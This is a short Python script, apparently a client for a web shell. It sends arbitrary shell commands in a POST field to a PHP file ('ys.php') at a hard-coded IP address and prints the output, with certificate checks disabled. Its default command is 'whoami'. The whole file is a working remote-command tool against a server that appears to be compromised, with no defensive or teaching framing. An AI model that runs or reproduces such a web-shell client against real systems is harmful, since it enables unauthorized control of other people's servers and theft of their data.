#!/usr/bin/env python3
"""通过ys.php执行命令(干净输出)"""
import urllib.request, ssl, sys, urllib.parse

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://124.71.142.158:9096/ys.php"

def exec_cmd(cmd):
    data = urllib.parse.urlencode({"x": cmd}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(B, data=data), timeout=15, context=ctx)
        return r.read().decode("utf-8","ignore").strip()
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "whoami"
    print(exec_cmd(cmd))
